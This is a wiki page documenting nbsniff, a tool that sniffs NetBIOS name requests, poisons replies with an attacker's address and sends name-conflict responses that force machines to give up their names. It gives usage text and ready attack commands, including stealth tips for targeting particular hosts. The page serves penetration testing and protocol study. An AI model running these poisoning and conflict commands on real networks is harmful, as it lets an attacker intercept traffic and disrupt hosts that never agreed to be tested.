---
title: 'Wiki: Nbsniff'
author: ron
layout: wiki
permalink: "/wiki/Nbsniff"
date: '2024-08-04T15:51:38-04:00'
redirect_from:
- "/wiki/index.php/Nbsniff"
---

## Intro

[nbsniff](nbsniff "wikilink") is designed to watch and poison NetBIOS name and registration requests. This lets a malicious user take over all names on a local network that aren\'t resolved by DNS. It can also force systems to relinquish their name at boot time if it\'s a name that the attacker wants.

## Usage

    Usage: ./nbsniff [options] <action>
     -h --help
        Help (this screen).
     -s --source <sourceip>
        The ip address to reply with when using --poison. Required for --poison.
     -n --name <name>
        The name to poison. If set, only requests containing this name will be
        poisoned.
     -p --port <port>
        Listen on a port instead of the default (137). Since requests are sent on
        UDP port 137, you likely don't want to change this.
     -u --username <user>
        Drop privileges to this user after opening socket (default: 'nobody')
     -w --wait <ms>
        The amount of time, in milliseconds, to wait for responses. Default: 500ms.
     -V --version
        Print version and exit.
    Actions (--sniff is always active):
     --sniff (default)
        Display all NetBIOS requests received. This is the default action.
     --poison [address]
        Poison NetBIOS requests by sending a response containing the --source ip
        whenever a name request from the address is seen. Requires --source to be
        set. If address isn't given, all targets are poisoned.
     --conflict [address]
        If this is set, when a system tries to register or renew a name, a conflict
        is returned, forcing the system to relinquish the name. If an address is
        given, only registratons/renewals from the address are replied to.

## Details

nbsniff listens on UDP port 137 by default. UDP/137 is used by Windows (and Samba) for the NetBIOS Name Service protocol. This protocol is used to resolve local names when DNS fails. For example, if you have a machine named WINDOWS2000 on the local network, you can run \"ping WINDOWS2000\" and it\'ll work. How? By a broadcast. The sequence of events are:

1.  Windows checks the local \'hosts\' file for an entry for \"WINDOWS2000\".
2.  Windows sends a DNS request to the default DNS server for \"WINDOWS2000\".
3.  Windows sends a DNS request to the default DNS server for \"WINDOWS2000.`<domain>`\".
4.  Windows broadcasts a NetBIOS name request to the local broadcast address.

The fourth point is the key \-- any box named \"WINDOWS2000\" that sees the NetBIOS name request responds saying \"I\'m here!\". nbsniff displays those requests. Now, how can we abuse them?

First, we have the \--poison argument. \--poison, by default, replies to every request with the given ip address (the address is given in \--source). So if you run:

    nbsniff --poison --source=1.2.3.4

Everybody NetBIOS name request will be responded to with 1.2.3.4.

If you want to be a little more stealthy, there are a couple extra options. \--name `<name>` can be used to respond only to requests containing a certain name. So, if you want to poison only requests containing \"windows\", you could run:

    nbsniff --poison --source=1.2.3.4 --name=windows

Note that it\'s not case sensitive.

Further, you can restrict poisoning to be against a certain address by giving the address as an argument to \--poison. Any request from the address will be responded to as usual. For example, if you want to only poison requests from 192.168.1.100, you can do this:

    nbsniff --poison=192.168.1.100 --source=1.2.3.4

After that, any request from 192.168.1.100 will be poisoned.

Now, what happens if there\'s actually a system on the local network named WINDOWS2000? Will it still respond to our requests?

The answer, unfortunately, is yes. If we\'re poisoning WINDOWS2000 with 1.2.3.4 and there\'s already a system on the network named WINDOWS2000, they will both respond:

    $ nbquery --nb=WINDOWS2000
    Creating a UDP socket.
    Sending query.
    ANSWER query: (NB:WINDOWS2000    <00|workstation>): success, IP: 1.2.3.4, TTL: 0s
    ANSWER query: (NB:WINDOWS2000    <00|workstation>): success, IP: 192.168.1.102, TTL: 300000s

In this case, the poisoned request arrived first. That won\'t always happen, be the case, though. It really comes down to a race. If you\'re lucky, you\'ll win.

The next question is, is there a way to cheat?

Of course there is! But, it\'s somewhat disruptive and causes an error message on the target machine.

The way we cheat, basically, is to tell any machines that try to claim a name that the name is already taken. This is done by using a \'conflict\' response, \--conflict. Like poison, you can pass a \--name argument to poison only certain names, and you can pass an address to \--conflict to only respond to that host.

Here is how you\'d respond to conflicts for 192.168.1.102 attempting to register WINDOWS2000, and respond with 1.2.3.4 if 192.168.1.100 tries to look it up:

    nbsniff --poison=192.168.1.100 --conflict=192.168.1.102 --name=WINDOWS2000 --source=1.2.3.4

Typically, though, you\'ll want to cast a broader net. This responds to every machine with a \'conflict\' and every name request with \'1.2.3.4\':

    nbsniff --poison --conflict --source=1.2.3.4

Once \'conflict\' is turned on, any machine on the local network who tries to claim a name will be forced to relinquish it. Machines claim names when they boot, so you\'ll have to wait for the machine to reboot (or force it to) to take over its name. Unfortunately, after receiving the conflict, the target machine displays a message saying \"A duplicate name exists on the network.\"

That\'s everything that nbsniff can do. Hope it helps!

And by the way, a great way to test the various features of nbsniff is by using [nbquery](nbquery "wikilink"). See its documentation for more info!
